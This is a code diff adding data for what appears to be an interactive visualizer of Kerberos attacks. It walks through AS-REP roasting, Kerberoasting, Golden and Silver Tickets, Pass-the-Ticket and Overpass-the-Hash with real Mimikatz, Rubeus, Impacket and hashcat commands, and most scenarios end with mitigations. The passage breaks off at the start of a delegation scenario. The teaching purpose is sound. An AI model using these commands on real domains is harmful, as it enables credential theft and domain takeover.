+							'req-body.sname': 'krbtgt/CORP.LOCAL',
+							'req-body.etype': '[23] ← Request RC4 for easier cracking'
+						}
+					},
+					{
+						title: 'Step 3: KDC Returns AS-REP',
+						description: 'The KDC returns an AS-REP containing data encrypted with the victim user\'s password hash. The attacker now has encrypted material they can crack offline.',
+						activeEntity: 'kdc',
+						animation: { from: 'kdc', to: 'attacker', packet: 'AS-REP (crackable!)', type: 'as-rep' },
+						techDetail: `<strong>What Attacker Receives:</strong><br>
+							• TGT (encrypted with KRBTGT hash - not useful)<br>
+							• enc-part (encrypted with victim's hash - TARGET!)<br><br>
+							<strong>The Prize:</strong><br>
+							The enc-part is encrypted with the victim's password hash.<br>
+							If attacker can crack this, they get the password!`,
+						packetContents: {
+							'pvno': '5',
+							'msg-type': 'KRB_AS_REP (11)',
+							'ticket (TGT)': '{ Encrypted with KRBTGT - not crackable }',
+							'enc-part': '{ ENCRYPTED WITH VICTIM PASSWORD HASH! }',
+							'  → This is what we crack!': '',
+							'  → session-key': 'Encrypted session key',
+							'  → nonce': 'Encrypted nonce'
+						}
+					},
+					{
+						title: 'Step 4: Extract Hash for Cracking',
+						description: 'The attacker extracts the encrypted portion of the AS-REP and formats it for offline password cracking tools like Hashcat or John the Ripper.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Hash Format (Hashcat mode 18200):</strong><br>
+							<code>$krb5asrep$23$victim.user@CORP.LOCAL:...</code><br><br>
+							<strong>Tools to Extract:</strong><br>
+							• Rubeus: <code>Rubeus.exe asreproast /format:hashcat</code><br>
+							• Impacket: <code>GetNPUsers.py -format hashcat</code><br>
+							• Kerberoast: <code>Invoke-ASREPRoast</code>`,
+						packetContents: null
+					},
+					{
+						title: 'Step 5: Offline Password Cracking',
+						description: 'The attacker uses GPU-accelerated cracking to brute-force the password. Since this is offline, there\'s no account lockout and unlimited attempts.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Cracking Commands:</strong><br>
+							<code>hashcat -m 18200 asrep.txt rockyou.txt</code><br>
+							<code>john --wordlist=rockyou.txt asrep.txt</code><br><br>
+							<strong>Speed (RTX 3080):</strong><br>
+							• RC4: ~2.5 billion hashes/second<br>
+							• AES256: ~250 million hashes/second<br><br>
+							<strong>No Detection:</strong><br>
+							• Happens on attacker's machine<br>
+							• No failed login events<br>
+							• No account lockouts`,
+						warning: 'Weak passwords can be cracked in seconds to minutes!'
+					},
+					{
+						title: 'Attack Complete: Password Obtained!',
+						description: 'If the password is weak, the attacker now has the victim\'s plaintext password and can authenticate as that user to access all their resources.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Post-Exploitation:</strong><br>
+							• Authenticate as victim user<br>
+							• Access user's resources (email, files, apps)<br>
+							• Lateral movement in network<br>
+							• If admin → domain compromise<br><br>
+							<strong>Mitigations:</strong><br>
+							• Enable pre-authentication for all accounts<br>
+							• Use long, complex passwords (25+ chars)<br>
+							• Use AES instead of RC4<br>
+							• Monitor for AS-REQ without pre-auth<br>
+							• Use gMSA for service accounts`,
+						success: false,
+						warning: 'Attacker has compromised the account!'
+					}
+				]
+			},
+
+			'kerberoasting': {
+				title: 'Kerberoasting Attack',
+				entities: [
+					{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Has Domain Creds', x: 5, y: 40 },
+					{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 45, y: 20 },
+					{ id: 'service', type: 'service', label: 'Service Account', sublabel: 'With SPN', x: 85, y: 40 }
+				],
+				steps: [
+					{
+						title: 'Prerequisites: Domain User Access',
+						description: 'The attacker has compromised any domain user account. This is enough to request service tickets for any SPN-enabled service account in the domain.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Why Any Domain User Works:</strong><br>
+							• Kerberos allows any authenticated user to request service tickets<br>
+							• No authorization check for requesting tickets<br>
+							• The ticket is encrypted with the service account's hash<br><br>
+							<strong>Target: SPN-Enabled Accounts</strong><br>
+							Service accounts with SPNs are vulnerable because:<br>
+							• Often have weak passwords<br>
+							• Often have elevated privileges<br>
+							• Password rarely changed`,
+						warning: 'Any domain user can perform this attack!'
+					},
+					{
+						title: 'Step 1: Enumerate Service Accounts with SPNs',
+						description: 'The attacker queries Active Directory for user accounts that have Service Principal Names (SPNs) registered. These are the Kerberoastable accounts.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Finding Kerberoastable Accounts:</strong><br>
+							<code>Get-ADUser -Filter {servicePrincipalName -like "*"} -Properties servicePrincipalName</code><br><br>
+							<strong>LDAP Query:</strong><br>
+							<code>(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))</code><br><br>
+							<strong>Tools:</strong><br>
+							• BloodHound (marks "Kerberoastable")<br>
+							• Rubeus: <code>Rubeus.exe kerberoast /stats</code><br>
+							• Impacket: <code>GetUserSPNs.py</code>`,
+						packetContents: null
+					},
+					{
+						title: 'Step 2: Authenticate to Get TGT',
+						description: 'The attacker authenticates with their compromised domain credentials to obtain a TGT. This is normal Kerberos authentication.',
+						activeEntity: 'attacker',
+						animation: { from: 'attacker', to: 'kdc', packet: 'AS-REQ', type: 'as-req' },
+						techDetail: `<strong>Normal Authentication:</strong><br>
+							• Attacker uses compromised domain user<br>
+							• Sends AS-REQ with pre-authentication<br>
+							• Receives TGT for further requests<br><br>
+							This step is completely normal and expected.`,
+						packetContents: null
+					},
+					{
+						title: 'Step 3: Receive TGT',
+						description: 'The KDC returns a TGT to the attacker. This TGT will be used to request service tickets.',
+						activeEntity: 'kdc',
+						animation: { from: 'kdc', to: 'attacker', packet: 'AS-REP + TGT', type: 'as-rep' },
+						techDetail: `<strong>Attacker now has:</strong><br>
+							• Valid TGT for their compromised user<br>
+							• Can request service tickets for any SPN<br>
+							• KDC will not question the request`,
+						packetContents: null
+					},
+					{
+						title: 'Step 4: Request Service Ticket (TGS-REQ)',
+						description: 'The attacker requests a service ticket for the target service account by specifying its SPN. The KDC happily provides the ticket.',
+						activeEntity: 'attacker',
+						animation: { from: 'attacker', to: 'kdc', packet: 'TGS-REQ for SPN', type: 'tgs-req' },
+						techDetail: `<strong>Malicious TGS-REQ:</strong><br>
+							• Attacker specifies target SPN<br>
+							• Example: <code>MSSQLSvc/sql01.corp.local:1433</code><br>
+							• KDC doesn't check if requester needs this service<br>
+							• No authorization = ticket granted`,
+						packetContents: {
+							'pvno': '5',
+							'msg-type': 'KRB_TGS_REQ (12)',
+							'padata[PA-TGS-REQ]': '{ Attacker\'s TGT }',
+							'req-body.sname': 'MSSQLSvc/sql01.corp.local:1433 ← TARGET',
+							'req-body.etype': '[23] ← Request RC4 for easier cracking',
+							'req-body.realm': 'CORP.LOCAL'
+						}
+					},
+					{
+						title: 'Step 5: Receive Service Ticket (TGS-REP)',
+						description: 'The KDC returns a service ticket encrypted with the service account\'s password hash. This is the data the attacker will crack.',
+						activeEntity: 'kdc',
+						animation: { from: 'kdc', to: 'attacker', packet: 'TGS-REP (crackable!)', type: 'tgs-rep' },
+						techDetail: `<strong>The Prize:</strong><br>
+							Service ticket is encrypted with the service account's NT hash!<br><br>
+							<strong>Why This Works:</strong><br>
+							• Service tickets are meant to be decrypted by services<br>
+							• Service account's password hash is the key<br>
+							• If attacker cracks it → they get the password`,
+						packetContents: {
+							'pvno': '5',
+							'msg-type': 'KRB_TGS_REP (13)',
+							'ticket': '{ ENCRYPTED WITH SERVICE ACCOUNT HASH! }',
+							'  → This is what we crack!': '',
+							'  → enc-part': 'Contains PAC, session key',
+							'enc-part': '{ Encrypted with TGS session key }'
+						}
+					},
+					{
+						title: 'Step 6: Extract Hash and Crack Offline',
+						description: 'The attacker extracts the service ticket and cracks it offline using Hashcat or John. No account lockout, no detection.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Hash Format (Hashcat mode 13100/19700):</strong><br>
+							RC4: <code>$krb5tgs$23$*svc_sql$CORP.LOCAL$...</code><br>
+							AES256: <code>$krb5tgs$18$...</code><br><br>
+							<strong>Cracking:</strong><br>
+							<code>hashcat -m 13100 tgs.txt rockyou.txt</code><br><br>
+							<strong>Speed Advantage:</strong><br>
+							• No network activity during cracking<br>
+							• Unlimited attempts<br>
+							• GPU acceleration`,
+						packetContents: null
+					},
+					{
+						title: 'Attack Complete: Service Account Compromised!',
+						description: 'If the password is weak, the attacker now owns the service account. Service accounts often have elevated privileges.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Post-Exploitation:</strong><br>
+							• Authenticate as service account<br>
+							• Often has admin rights on servers<br>
+							• May be in privileged groups<br>
+							• Can access databases, applications<br><br>
+							<strong>Mitigations:</strong><br>
+							• Use gMSA (Group Managed Service Accounts)<br>
+							• 25+ character random passwords<br>
+							• Minimize service account privileges<br>
+							• Use AES encryption<br>
+							• Monitor for excessive TGS-REQ`,
+						warning: 'Service account compromised! Often leads to privilege escalation.',
+						success: false
+					}
+				]
+			},
+
+			'golden-ticket': {
+				title: 'Golden Ticket Attack',
+				entities: [
+					{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Has KRBTGT Hash', x: 5, y: 40 },
+					{ id: 'forged', type: 'krbtgt', label: 'Forged TGT', sublabel: 'Golden Ticket', x: 45, y: 70 },
+					{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 45, y: 10 },
+					{ id: 'service', type: 'service', label: 'Any Service', sublabel: 'Full Domain Access', x: 85, y: 40 }
+				],
+				steps: [
+					{
+						title: 'Prerequisites: KRBTGT Hash Obtained',
+						description: 'The attacker has obtained the KRBTGT account\'s password hash. This typically requires Domain Admin access or DCSync privileges.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>How KRBTGT Hash is Obtained:</strong><br>
+							• DCSync attack: <code>mimikatz # lsadump::dcsync /user:krbtgt</code><br>
+							• Domain Controller compromise + NTDS.dit extraction<br>
+							• LSASS dump from DC<br><br>
+							<strong>The KRBTGT Account:</strong><br>
+							• Built-in account in every AD domain<br>
+							• Password hash encrypts ALL TGTs<br>
+							• Never used for interactive logon<br>
+							• Password changes are rare (and require both old+new)`,
+						warning: 'KRBTGT hash = Keys to the kingdom!'
+					},
+					{
+						title: 'Step 1: Gather Required Information',
+						description: 'To forge a valid TGT, the attacker needs specific domain information: Domain SID, Domain Name, and target user information.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Information Needed:</strong><br>
+							• KRBTGT NT hash<br>
+							• Domain SID: <code>S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX</code><br>
+							• Domain name: <code>CORP.LOCAL</code><br>
+							• Username to impersonate (any, even non-existent!)<br><br>
+							<strong>Get Domain SID:</strong><br>
+							<code>whoami /all</code> or <code>Get-ADDomain</code>`,
+						packetContents: null
+					},
+					{
+						title: 'Step 2: Forge the Golden Ticket',
+						description: 'Using the KRBTGT hash, the attacker creates a fake TGT with arbitrary user identity and group memberships. They can claim to be any user with any privileges.',
+						activeEntity: 'attacker',
+						animation: { from: 'attacker', to: 'forged', packet: 'Forge TGT', type: 'ticket' },
+						techDetail: `<strong>Mimikatz Command:</strong><br>
+							<code>kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:&lt;hash&gt; /ptt</code><br><br>
+							<strong>What's in the Forged TGT:</strong><br>
+							• Any username (even fake ones!)<br>
+							• Any group memberships (Domain Admins, Enterprise Admins)<br>
+							• Custom lifetime (10 years!)<br>
+							• Valid encryption with KRBTGT hash`,
+						packetContents: {
+							'FORGED TGT Contents:': '',
+							'realm': 'CORP.LOCAL',
+							'cname': 'FakeAdmin (or any name)',
+							'PAC.LogonInfo.UserId': '500 (Administrator RID)',
+							'PAC.LogonInfo.GroupIds': '[512, 519, 518, 544] ← All admin groups!',
+							'PAC.LogonInfo.UserFlags': 'All privileges enabled',
+							'starttime': 'Attacker-controlled',
+							'endtime': '10 years from now!',
+							'encrypted with': 'KRBTGT hash (makes it valid!)'
+						}
+					},
+					{
+						title: 'Step 3: Inject Golden Ticket',
+						description: 'The forged TGT is injected into the attacker\'s session memory. It can now be used to request service tickets for any service.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Ticket Injection:</strong><br>
+							Mimikatz <code>/ptt</code> flag = Pass-the-Ticket<br><br>
+							<strong>Alternative: Export to File</strong><br>
+							<code>/ticket:golden.kirbi</code> for later use<br><br>
+							<strong>No KDC Contact Required!</strong><br>
+							• The TGT is already forged<br>
+							• No AS-REQ/AS-REP needed<br>
+							• Attacker skips authentication entirely`,
+						packetContents: null
+					},
+					{
+						title: 'Step 4: Request Service Tickets',
+						description: 'The attacker uses the golden ticket to request service tickets from the KDC. The KDC trusts the forged TGT because it\'s validly encrypted.',
+						activeEntity: 'attacker',
+						animation: { from: 'attacker', to: 'kdc', packet: 'TGS-REQ + Golden Ticket', type: 'tgs-req' },
+						techDetail: `<strong>Why KDC Trusts It:</strong><br>
+							1. TGT is encrypted with KRBTGT hash ✓<br>
+							2. KDC decrypts it successfully ✓<br>
+							3. Extracts PAC with fake groups ✓<br>
+							4. Creates service ticket with those groups<br><br>
+							<strong>KDC Cannot Tell It's Fake!</strong>`,
+						packetContents: null
+					},
+					{
+						title: 'Step 5: Receive Service Tickets',
+						description: 'The KDC returns valid service tickets based on the fake identity and group memberships in the golden ticket.',
+						activeEntity: 'kdc',
+						animation: { from: 'kdc', to: 'attacker', packet: 'TGS-REP', type: 'tgs-rep' },
+						techDetail: `<strong>Service Ticket Contents:</strong><br>
+							• PAC copied from Golden Ticket<br>
+							• Fake user appears as Domain Admin<br>
+							• Valid service ticket for any service<br><br>
+							<strong>Attack Surface:</strong><br>
+							• Access any computer as admin<br>
+							• Access any share<br>
+							• DCSync (if Enterprise Admin)<br>
+							• Complete domain control`,
+						packetContents: null
+					},
+					{
+						title: 'Step 6: Access Any Service',
+						description: 'The attacker presents the service ticket to any service in the domain. The service sees a legitimate Domain Admin.',
+						activeEntity: 'attacker',
+						animation: { from: 'attacker', to: 'service', packet: 'AP-REQ', type: 'ap-req' },
+						techDetail: `<strong>Full Domain Access:</strong><br>
+							• <code>psexec \\dc01 cmd</code> - Admin on DCs<br>
+							• Access any file share<br>
+							• Execute code anywhere<br>
+							• Modify AD objects<br><br>
+							<strong>Persistence:</strong><br>
+							• Ticket valid for 10 years by default<br>
+							• Works even if user password changes<br>
+							• Works even if user is disabled/deleted!`,
+						packetContents: null
+					},
+					{
+						title: 'Attack Complete: Persistent Domain Compromise!',
+						description: 'The attacker has complete, long-term access to the entire domain. This persists until the KRBTGT password is changed TWICE.',
+						activeEntity: 'service',
+						techDetail: `<strong>Golden Ticket Persistence:</strong><br>
+							• Valid until KRBTGT password changes (twice!)<br>
+							• Survives user password resets<br>
+							• Survives user account disabling<br>
+							• Works from any network location<br><br>
+							<strong>Remediation:</strong><br>
+							• Change KRBTGT password TWICE<br>
+							• Wait for TGT lifetime between changes<br>
+							• This invalidates ALL existing tickets<br>
+							• Find and remove attacker access first!`,
+						warning: 'Complete domain compromise with long-term persistence!',
+						success: false
+					}
+				]
+			},
+
+			'silver-ticket': {
+				title: 'Silver Ticket Attack',
+				entities: [
+					{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Has Service Hash', x: 5, y: 40 },
+					{ id: 'forged', type: 'service', label: 'Forged Ticket', sublabel: 'Silver Ticket', x: 45, y: 70 },
+					{ id: 'service', type: 'service', label: 'Target Service', sublabel: 'e.g., SQL Server', x: 85, y: 40 }
+				],
+				steps: [
+					{
+						title: 'Prerequisites: Service Account Hash',
+						description: 'The attacker has obtained a service account\'s password hash. This could be from Kerberoasting, credential dumping, or other means.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>How Service Hash is Obtained:</strong><br>
+							• Kerberoasting + password cracking<br>
+							• LSASS dump on service server<br>
+							• Credential theft from memory<br>
+							• LSA Secrets registry extraction<br><br>
+							<strong>Common Targets:</strong><br>
+							• SQL Server service accounts<br>
+							• IIS application pool accounts<br>
+							• Exchange service accounts<br>
+							• File server computer accounts`,
+						warning: 'Silver Ticket = Targeted access without touching DC!'
+					},
+					{
+						title: 'Difference from Golden Ticket',
+						description: 'Unlike Golden Ticket which forges TGTs, Silver Ticket forges service tickets directly. This bypasses the KDC entirely for the target service.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Golden Ticket vs Silver Ticket:</strong><br><br>
+							<table style="width:100%; color:#ccc; font-size:12px;">
+							<tr><td></td><td><strong>Golden</strong></td><td><strong>Silver</strong></td></tr>
+							<tr><td>Forges</td><td>TGT</td><td>Service Ticket</td></tr>
+							<tr><td>Key Needed</td><td>KRBTGT hash</td><td>Service account hash</td></tr>
+							<tr><td>Scope</td><td>Entire domain</td><td>Single service</td></tr>
+							<tr><td>Contacts DC</td><td>Yes (for TGS)</td><td>No!</td></tr>
+							<tr><td>Detection</td><td>Easier</td><td>Harder</td></tr>
+							</table>`,
+						packetContents: null
+					},
+					{
+						title: 'Step 1: Gather Service Information',
+						description: 'The attacker needs the service account\'s NT hash, SPN, domain SID, and the user identity to impersonate.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Information Needed:</strong><br>
+							• Service account NT hash<br>
+							• Service Principal Name (SPN)<br>
+							• Domain SID<br>
+							• Target username to impersonate<br><br>
+							<strong>Example for SQL Server:</strong><br>
+							SPN: <code>MSSQLSvc/sql01.corp.local:1433</code><br>
+							Service account: <code>svc_sql</code>`,
+						packetContents: null
+					},
+					{
+						title: 'Step 2: Forge Silver Ticket',
+						description: 'Using the service account hash, the attacker creates a fake service ticket with arbitrary identity and group memberships.',
+						activeEntity: 'attacker',
+						animation: { from: 'attacker', to: 'forged', packet: 'Forge Service Ticket', type: 'ticket' },
+						techDetail: `<strong>Mimikatz Command:</strong><br>
+							<code>kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /target:sql01.corp.local /service:MSSQLSvc /rc4:&lt;svc_hash&gt; /ptt</code><br><br>
+							<strong>Forged Ticket Contains:</strong><br>
+							• Fake PAC with admin groups<br>
+							• Encrypted with service account hash<br>
+							• No KDC signature (but often not verified!)`,
+						packetContents: {
+							'FORGED SERVICE TICKET:': '',
+							'service': 'MSSQLSvc/sql01.corp.local',
+							'cname': 'Administrator (forged)',
+							'PAC.GroupIds': '[512, 544] ← Admin groups',
+							'encrypted with': 'Service account hash',
+							'NOTE': 'No valid KDC PAC signature!'
+						}
+					},
+					{
+						title: 'Step 3: Access Service Directly',
+						description: 'The attacker presents the forged ticket directly to the target service. No KDC is contacted - the service validates the ticket itself.',
+						activeEntity: 'attacker',
+						animation: { from: 'attacker', to: 'service', packet: 'AP-REQ + Silver Ticket', type: 'ap-req' },
+						techDetail: `<strong>Direct Service Access:</strong><br>
+							• AP-REQ goes directly to service<br>
+							• Service decrypts with its own hash<br>
+							• Decryption succeeds = ticket accepted!<br><br>
+							<strong>Stealth Advantage:</strong><br>
+							• No TGS-REQ to DC<br>
+							• No DC logs for this access<br>
+							• Only service logs the connection`,
+						packetContents: null
+					},
+					{
+						title: 'Step 4: Service Validates Ticket',
+						description: 'The service decrypts the ticket with its password hash. Since it decrypts successfully, the service trusts the fake identity and privileges.',
+						activeEntity: 'service',
+						techDetail: `<strong>Why It Works:</strong><br>
+							1. Ticket encrypted with correct hash ✓<br>
+							2. Decryption succeeds ✓<br>
+							3. PAC extracted with fake groups ✓<br><br>
+							<strong>PAC Validation Issue:</strong><br>
+							• PAC has KDC signature (should be verified)<br>
+							• Many services SKIP this check!<br>
+							• They trust if decryption works<br>
+							• Microsoft patching this (CVE-2021-42287)`,
+						packetContents: null
+					},
+					{
+						title: 'Attack Complete: Service Compromised!',
+						description: 'The attacker has admin access to the specific service without ever contacting the domain controller.',
+						activeEntity: 'service',
+						techDetail: `<strong>Access Gained:</strong><br>
+							• SQL Server → Database admin<br>
+							• File Server → File access<br>
+							• Web Server → Application control<br>
+							• Computer account → Local admin (CIFS)<br><br>
+							<strong>Common Silver Ticket Uses:</strong><br>
+							• CIFS - File share access<br>
+							• HTTP - Web application access<br>
+							• MSSQLSvc - Database access<br>
+							• HOST - Remote admin (PSRemoting)<br><br>
+							<strong>Mitigations:</strong><br>
+							• Enable PAC validation<br>
+							• Use gMSA<br>
+							• Monitor service access logs`,
+						warning: 'Stealthy service compromise - minimal DC logging!',
+						success: false
+					}
+				]
+			},
+
+			'pass-the-ticket': {
+				title: 'Pass-the-Ticket Attack',
+				entities: [
+					{ id: 'victim', type: 'client', label: 'Victim', sublabel: 'Has Valid Tickets', x: 5, y: 20 },
+					{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Steals Tickets', x: 5, y: 60 },
+					{ id: 'service', type: 'service', label: 'Target Service', sublabel: 'Accepts Stolen Ticket', x: 85, y: 40 }
+				],
+				steps: [
+					{
+						title: 'Concept: Ticket Theft',
+						description: 'Kerberos tickets are stored in memory and can be extracted. If an attacker can access LSASS memory, they can steal and reuse these tickets.',
+						activeEntity: 'victim',
+						techDetail: `<strong>Where Tickets are Stored:</strong><br>
+							• Windows: LSASS process memory<br>
+							• Linux: /tmp/krb5cc_* or KEYRING<br><br>
+							<strong>Ticket Types:</strong><br>
+							• TGT - Can get new service tickets<br>
+							• Service Tickets - Access specific services<br><br>
+							<strong>No Password Needed!</strong><br>
+							Tickets are valid authentication tokens.`,
+						warning: 'Tickets are as good as passwords!'
+					},
+					{
+						title: 'Step 1: Compromise Victim Machine',
+						description: 'The attacker gains local admin access on a machine where a target user is logged in or has cached tickets.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Common Scenarios:</strong><br>
+							• Admin RDPs to workstation<br>
+							• Service account runs on server<br>
+							• User left session logged in<br>
+							• Cached credentials from recent login<br><br>
+							<strong>Requirement:</strong><br>
+							Local admin or SYSTEM privileges to read LSASS`,
+						packetContents: null
+					},
+					{
+						title: 'Step 2: Dump Tickets from Memory',
+						description: 'Using Mimikatz or Rubeus, the attacker extracts all Kerberos tickets from LSASS memory.',
+						activeEntity: 'attacker',
+						animation: { from: 'victim', to: 'attacker', packet: 'Steal Tickets', type: 'malicious' },
+						techDetail: `<strong>Extraction Commands:</strong><br><br>
+							<strong>Mimikatz:</strong><br>
+							<code>sekurlsa::tickets /export</code><br><br>
+							<strong>Rubeus:</strong><br>
+							<code>Rubeus.exe dump</code><br>
+							<code>Rubeus.exe triage</code> (list tickets)<br><br>
+							<strong>Output:</strong><br>
+							• .kirbi files (Windows format)<br>
+							• .ccache files (Linux format)`,
+						packetContents: {
+							'Stolen Tickets:': '',
+							'[0] TGT': 'krbtgt/CORP.LOCAL @ CORP.LOCAL',
+							'    Client': 'admin.user @ CORP.LOCAL',
+							'    EndTime': '12/26/2025 10:00:00 PM',
+							'[1] Service Ticket': 'CIFS/fileserver.corp.local',
+							'    Client': 'admin.user @ CORP.LOCAL',
+							'[2] Service Ticket': 'HTTP/webapp.corp.local',
+							'    Client': 'admin.user @ CORP.LOCAL'
+						}
+					},
+					{
+						title: 'Step 3: Inject Ticket into Attacker Session',
+						description: 'The attacker imports the stolen ticket into their own session, assuming the victim\'s identity.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Ticket Injection:</strong><br><br>
+							<strong>Mimikatz:</strong><br>
+							<code>kerberos::ptt ticket.kirbi</code><br><br>
+							<strong>Rubeus:</strong><br>
+							<code>Rubeus.exe ptt /ticket:base64blob</code><br><br>
+							<strong>Linux:</strong><br>
+							<code>export KRB5CCNAME=/path/to/stolen.ccache</code><br><br>
+							<strong>Result:</strong><br>
+							Attacker's session now has victim's ticket`,
+						packetContents: null
+					},
+					{
+						title: 'Step 4: Access Services as Victim',
+						description: 'The attacker can now access any service the stolen ticket is valid for, appearing as the original ticket owner.',
+						activeEntity: 'attacker',
+						animation: { from: 'attacker', to: 'service', packet: 'AP-REQ (Stolen Ticket)', type: 'ap-req' },
+						techDetail: `<strong>With Stolen TGT:</strong><br>
+							• Request new service tickets<br>
+							• Access any service victim can access<br>
+							• Valid until TGT expires<br><br>
+							<strong>With Stolen Service Ticket:</strong><br>
+							• Access that specific service only<br>
+							• Cannot request new service tickets<br>
+							• Valid until service ticket expires`,
+						packetContents: null
+					},
+					{
+						title: 'Attack Complete: Identity Hijacked!',
+						description: 'The attacker is now operating with the victim\'s Kerberos identity and can access all resources the victim has access to.',
+						activeEntity: 'service',
+						techDetail: `<strong>Attack Impact:</strong><br>
+							• Full impersonation of victim<br>
+							• Access all victim's resources<br>
+							• If victim is admin → admin access<br>
+							• Appears as legitimate user in logs<br><br>
+							<strong>Mitigations:</strong><br>
+							• Protected Users group (no delegation)<br>
+							• Credential Guard<br>
+							• Short ticket lifetimes<br>
+							• Monitor for ticket anomalies`,
+						warning: 'Attacker has victim\'s full identity!',
+						success: false
+					}
+				]
+			},
+
+			'overpass-hash': {
+				title: 'Overpass-the-Hash Attack',
+				entities: [
+					{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Has NT Hash', x: 5, y: 40 },
+					{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 50, y: 40 },
+					{ id: 'service', type: 'service', label: 'Target Service', sublabel: 'Kerberos Auth', x: 85, y: 40 }
+				],
+				steps: [
+					{
+						title: 'Concept: Hash to Kerberos Ticket',
+						description: 'Overpass-the-Hash converts an NTLM hash into a Kerberos TGT. This allows lateral movement to systems that only accept Kerberos (not NTLM).',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Pass-the-Hash vs Overpass-the-Hash:</strong><br><br>
+							<strong>Pass-the-Hash:</strong><br>
+							• Uses NTLM hash for NTLM authentication<br>
+							• Fails if NTLM is disabled<br>
+							• Logged as NTLM logon<br><br>
+							<strong>Overpass-the-Hash:</strong><br>
+							• Uses NTLM hash to get Kerberos ticket<br>
+							• Works with Kerberos-only systems<br>
+							• Logged as Kerberos logon<br>
+							• More stealthy`,
+						warning: 'NTLM hash is equivalent to the password for Kerberos!'
+					},
+					{
+						title: 'Step 1: Obtain User NTLM Hash',
+						description: 'The attacker obtains the target user\'s NTLM hash through credential dumping, DCSync, or other means.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Hash Sources:</strong><br>
+							• LSASS dump: <code>sekurlsa::logonpasswords</code><br>
+							• SAM database: <code>lsadump::sam</code><br>
+							• DCSync: <code>lsadump::dcsync /user:admin</code><br>
+							• NTDS.dit extraction<br><br>
+							<strong>NTLM Hash Format:</strong><br>
+							<code>aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</code>`,
+						packetContents: null
+					},
+					{
+						title: 'Step 2: Request TGT with Hash',
+						description: 'Using the NTLM hash instead of a password, the attacker performs Kerberos pre-authentication and requests a TGT.',
+						activeEntity: 'attacker',
+						animation: { from: 'attacker', to: 'kdc', packet: 'AS-REQ (hash-based auth)', type: 'as-req' },
+						techDetail: `<strong>How It Works:</strong><br>
+							1. Pre-auth encrypts timestamp with password hash<br>
+							2. NTLM hash IS the password hash<br>
+							3. Attacker uses hash directly to encrypt timestamp<br>
+							4. KDC can't tell the difference<br><br>
+							<strong>Mimikatz:</strong><br>
+							<code>sekurlsa::pth /user:admin /domain:corp.local /ntlm:&lt;hash&gt; /run:powershell.exe</code>`,
+						packetContents: {
+							'AS-REQ (Overpass-the-Hash):': '',
+							'padata[PA-ENC-TIMESTAMP]': '{ Encrypted with NTLM hash directly }',
+							'req-body.cname': 'admin@CORP.LOCAL',
+							'req-body.sname': 'krbtgt/CORP.LOCAL',
+							'Note': 'KDC cannot distinguish from password auth!'
+						}
+					},
+					{
+						title: 'Step 3: Receive Valid TGT',
+						description: 'The KDC validates the pre-authentication (it can\'t tell a hash was used) and returns a valid TGT.',
+						activeEntity: 'kdc',
+						animation: { from: 'kdc', to: 'attacker', packet: 'AS-REP + TGT', type: 'as-rep' },
+						techDetail: `<strong>Attacker Now Has:</strong><br>
+							• Valid TGT for the target user<br>
+							• Can request service tickets<br>
+							• Full Kerberos authentication<br><br>
+							<strong>Advantages over Pass-the-Hash:</strong><br>
+							• Works with Kerberos-only systems<br>
+							• Appears as normal Kerberos auth<br>
+							• Avoids NTLM-specific detections`,
+						packetContents: null
+					},
+					{
+						title: 'Step 4: Use TGT for Lateral Movement',
+						description: 'The attacker uses the TGT to request service tickets and access resources, appearing as a legitimate Kerberos user.',
+						activeEntity: 'attacker',
+						animation: { from: 'attacker', to: 'service', packet: 'Access Service', type: 'ap-req' },
+						techDetail: `<strong>Lateral Movement Options:</strong><br>
+							• psexec to other machines<br>
+							• WMI/WinRM remote execution<br>
+							• File share access<br>
+							• Database connections<br><br>
+							<strong>Tools:</strong><br>
+							• Mimikatz pth module<br>
+							• Rubeus asktgt<br>
+							• Impacket getTGT.py`,
+						packetContents: null
+					},
+					{
+						title: 'Attack Complete: Kerberos Access from Hash!',
+						description: 'The attacker has converted an NTLM hash into full Kerberos authentication, bypassing NTLM restrictions.',
+						activeEntity: 'service',
+						techDetail: `<strong>Attack Benefits:</strong><br>
+							• Bypasses NTLM blocking<br>
+							• Works on modern, hardened systems<br>
+							• Appears as legitimate Kerberos auth<br>
+							• Full lateral movement capability<br><br>
+							<strong>Mitigations:</strong><br>
+							• Protected Users group<br>
+							• Credential Guard<br>
+							• AES-only Kerberos (blocks RC4)<br>
+							• Monitor for suspicious TGT requests`,
+						warning: 'Hash = Password for Kerberos authentication!',
+						success: false
+					}
+				]
+			},
+
+			'unconstrained-deleg': {
+				title: 'Unconstrained Delegation Attack',
+				entities: [
+					{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Controls Deleg Server', x: 5, y: 40 },
+					{ id: 'delegsrv', type: 'service', label: 'Delegation Server', sublabel: 'Unconstrained', x: 35, y: 40 },
+					{ id: 'victim', type: 'client', label: 'Victim Admin', sublabel: 'High-Priv User', x: 65, y: 10 },
